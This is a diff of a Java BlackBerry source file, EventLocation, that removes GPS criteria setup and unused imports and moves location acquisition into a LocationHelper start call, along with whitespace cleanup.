@@ -8,18 +8,11 @@
  * *************************************************/
 package blackberry.event;
 
-import java.io.EOFException;
-import java.io.IOException;
-
 import javax.microedition.location.Coordinates;
-import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
-import javax.microedition.location.LocationException;
 import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
-import net.rim.device.api.util.DataBuffer;
-import blackberry.config.Conf;
 import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
@@ -68,29 +61,6 @@ public final class EventLocation extends Event implements LocationObserver {
     }
 
     protected void actualStart() {
-        final Criteria criteria = new Criteria();
-        criteria.setCostAllowed(true);
-
-        criteria.setHorizontalAccuracy(50);
-        criteria.setVerticalAccuracy(50);
-        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);
-
-        try {
-            lp = LocationProvider.getInstance(criteria);
-
-        } catch (final LocationException e) {
-            //#ifdef DEBUG
-            debug.error(e);
-            //#endif
-        }
-
-        if (lp == null) {
-            //#ifdef DEBUG
-            debug.error("GPS Not Supported on Device");
-            //#endif               
-            setPeriod(NEVER);
-            return;
-        }
 
         //#ifdef DEBUG
         debug.trace("setLocationListener");
@@ -114,18 +84,18 @@ public final class EventLocation extends Event implements LocationObserver {
             //#endif               
             return;
         }
-    
+
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return;
         }
-    
+
         synchronized (this) {
-            LocationHelper.getInstance().locationGPS(lp, this, false);
+            LocationHelper.getInstance().start(this, false);
         }
-    
+
         //#ifdef DEBUG
         debug.trace("exiting actualRun");
         //#endif
@@ -139,7 +109,7 @@ public final class EventLocation extends Event implements LocationObserver {
             //lp.setLocationListener(null, -1, -1, -1 );
             lp.reset();
         }
-        
+
         onExit();
     }
 
